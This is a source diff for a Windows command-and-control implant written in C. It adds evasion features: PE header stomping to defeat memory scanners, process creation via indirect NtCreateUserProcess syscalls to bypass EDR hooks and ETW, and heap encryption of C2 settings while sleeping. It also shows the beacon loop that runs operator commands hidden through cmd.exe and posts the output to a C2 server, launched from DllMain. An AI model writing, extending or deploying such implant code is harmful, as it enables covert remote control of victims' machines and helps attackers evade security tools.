@@ -46,6 +46,24 @@
 #ifndef SYSCALL_METHOD
 #define SYSCALL_METHOD 0  /* 0=auto, 1=hellsgate-disk, 2=halosgate-memory */
 #endif
+/* Issue #7: use NtCreateUserProcess instead of CreateProcessA */
+#ifndef ENABLE_NT_PROCESS
+#define ENABLE_NT_PROCESS 1
+#endif
+/* Issue #4: XOR-encrypt sensitive heap globals during sleep */
+#ifndef ENABLE_HEAP_ENCRYPT
+#define ENABLE_HEAP_ENCRYPT 1
+#endif
+/* PE Header Stomping: overwrite MZ/PE magic in-memory to defeat pe-sieve */
+#ifndef ENABLE_PE_STOMP
+#define ENABLE_PE_STOMP 1
+#endif
+#ifndef PE_STOMP_MODE
+#define PE_STOMP_MODE 2    /* 1=DOS-only, 2=full-NT, 3=sledgehammer */
+#endif
+#ifndef PE_STOMP_RANDOMISE
+#define PE_STOMP_RANDOMISE 0  /* 0=zero-fill, 1=pseudo-random */
+#endif
 
 #define BUF_SIZE 65536
 
@@ -59,9 +77,18 @@
 #include "portscan.h"
 
 /* ── Runtime-configurable sleep (server can change via 'sleep' command) */
-static int g_sleep_ms   = 5000;
-static int g_jitter_pct = 20;
+static int  g_sleep_ms   = 5000;
+static int  g_jitter_pct = 20;
 static char g_agent_id[128] = {0};
+
+/* Writable C2 params (RW memory so encrypted_sleep can XOR in place) */
+static char g_c2_host[256] = {0};
+static int  g_c2_port      = 0;
+static int  g_c2_https     = 0;
+
+/* Own module base -- set in DllMain (DLL mode) or NULL (EXE mode).
+ * Used by stomp_pe_header() so it stomps the correct image base. */
+static HMODULE g_own_module = NULL;
 
 /* ── Helpers ─────────────────────────────────────────────── */
 
@@ -176,15 +203,40 @@ static int exec_cmd(const char *cmd, char *out_b64, size_t out_b64_len) {
     SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
     HANDLE hRead, hWrite;
     if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return -1;
+    PROCESS_INFORMATION pi; memset(&pi, 0, sizeof(pi));
+
+#if ENABLE_NT_PROCESS && ENABLE_INDIRECT_SYSCALL
+    /*
+     * NT path: NtCreateUserProcess via the indirect syscall engine.
+     * Bypasses CreateProcess Win32 shim, ETW ProcessCreate events,
+     * and AV/EDR hooks on CreateProcessInternalW.
+     */
+    NTSTATUS nt_st = NT_exec_cmdline(cmd, hWrite, hWrite, &pi);
+    if (!NT_SUCCESS(nt_st)) {
+        /* NT path failed -- fall back to Win32 CreateProcessA */
+        STARTUPINFOA si_fb; memset(&si_fb, 0, sizeof(si_fb)); si_fb.cb = sizeof(si_fb);
+        si_fb.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+        si_fb.hStdOutput = si_fb.hStdError = hWrite; si_fb.wShowWindow = SW_HIDE;
+        char fb_cmd[4096];
+        snprintf(fb_cmd, sizeof(fb_cmd), "cmd.exe /c %s", cmd);
+        if (!CreateProcessA(NULL, fb_cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW,
+                            NULL, NULL, &si_fb, &pi)) {
+            CloseHandle(hRead); CloseHandle(hWrite); out_b64[0] = '\0'; return -1;
+        }
+    }
+#else
+    /* Win32 path (ENABLE_NT_PROCESS=0 or indirect syscall disabled) */
     STARTUPINFOA si; memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
     si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
     si.hStdOutput = si.hStdError = hWrite; si.wShowWindow = SW_HIDE;
-    PROCESS_INFORMATION pi; memset(&pi, 0, sizeof(pi));
     char cmdline[4096];
     snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", cmd);
-    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW,
+                        NULL, NULL, &si, &pi)) {
         CloseHandle(hRead); CloseHandle(hWrite); out_b64[0] = '\0'; return -1;
     }
+#endif
+
     CloseHandle(hWrite);
     char raw[BUF_SIZE]; DWORD n, total = 0;
     while (ReadFile(hRead, raw+total, sizeof(raw)-total-1, &n, NULL) && n > 0) {
@@ -501,10 +553,31 @@ static int parse_tasks(const char *resp, parsed_task *tasks, int max_tasks) {
 
 static DWORD WINAPI run_beacon(LPVOID unused) {
     (void)unused;
-    const char *host = C2_HOST;
+
+    /*
+     * FIRST: stomp our own PE header before any network or evasion calls.
+     * Windows has already mapped all sections -- header is now dead weight.
+     * This defeats pe-sieve, Moneta, and memory-dump forensic scanners.
+     */
+#if ENABLE_PE_STOMP
+    {
+        HMODULE own_base = g_own_module ? g_own_module : GetModuleHandleA(NULL);
+        stomp_pe_header(own_base);
+    }
+#endif
+
+    /* Copy compile-time C2 params into writable globals */
+    strncpy(g_c2_host, C2_HOST, sizeof(g_c2_host) - 1);
+    g_c2_host[sizeof(g_c2_host) - 1] = '\0';
+    g_c2_port  = C2_PORT;
+    g_c2_https = USE_HTTPS;
+
+    /* Register all sensitive globals for heap XOR during sleep */
+    heap_register_region(g_agent_id, sizeof(g_agent_id));
+    heap_register_region(g_c2_host,  sizeof(g_c2_host));
+    heap_register_region(&g_c2_port, sizeof(g_c2_port));
+
     const char *path = "/";
-    int port = C2_PORT;
-    int use_https = USE_HTTPS;
 
     /* ── Evasion at startup ── */
 #if ENABLE_INDIRECT_SYSCALL
@@ -547,7 +620,7 @@ static DWORD WINAPI run_beacon(LPVOID unused) {
             snprintf(body, sizeof(body), "{}");
         }
 
-        if (http_post(host, port, use_https, path, body, strlen(body),
+        if (http_post(g_c2_host, g_c2_port, g_c2_https, path, body, strlen(body),
                       g_agent_id[0] ? g_agent_id : NULL, resp, sizeof(resp)) != 0)
             goto do_sleep;
 
@@ -655,7 +728,7 @@ static DWORD WINAPI run_beacon(LPVOID unused) {
         }
 
         roff += (size_t)snprintf(results + roff, results_cap - roff, "]}");
-        http_post(host, port, use_https, path, results, roff, g_agent_id, resp, sizeof(resp));
+        http_post(g_c2_host, g_c2_port, g_c2_https, path, results, roff, g_agent_id, resp, sizeof(resp));
         free(results);
 
         if (should_exit) ExitProcess(0);
@@ -670,10 +743,13 @@ do_sleep:
             if (s < 500) s = 500;
 
 #if ENABLE_SLEEP_ENCRYPT
-            if (g_agent_id[0]) /* only encrypt sleep after registration */
+            if (g_agent_id[0]) {
+                /* One-time: init heap XOR key after registration */
+                heap_key_init();
                 encrypted_sleep((DWORD)s);
-            else
+            } else {
                 Sleep((DWORD)s);
+            }
 #else
             Sleep((DWORD)s);
 #endif
@@ -688,6 +764,7 @@ do_sleep:
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
     (void)lpReserved;
     if (reason == DLL_PROCESS_ATTACH) {
+        g_own_module = hModule; /* save base for PE stomper */
         DisableThreadLibraryCalls(hModule);
         CreateThread(NULL, 0, run_beacon, NULL, 0, NULL);
     }
